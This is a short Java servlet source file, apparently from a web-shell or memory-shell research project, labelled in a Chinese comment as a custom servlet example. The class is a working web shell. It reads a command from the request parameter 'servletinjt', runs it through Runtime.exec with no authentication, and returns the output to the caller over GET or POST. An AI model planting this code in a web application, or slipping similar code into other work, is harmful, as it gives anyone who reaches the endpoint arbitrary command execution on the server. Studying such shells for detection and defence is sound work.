package me.mole.servlet;

import javax.servlet.GenericServlet;
import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

//自定义Servlet示例
public class Demo6 extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            ServletOutputStream out = resp.getOutputStream();
            String cmds = req.getParameter("servletinjt");
            if (cmds != null) {
                InputStream in = Runtime.getRuntime().exec(cmds.split(" ")).getInputStream();
                StringBuilder sb = new StringBuilder();
                BufferedReader br = new BufferedReader(new InputStreamReader(in));
                String line = null;
                while((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                if (sb.length() > 0) {
                    out.print("<pre>");
                    out.write(sb.toString().getBytes());
                    out.print("</pre>");
                    out.flush();
                    out.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doGet(req, resp);
    }
}
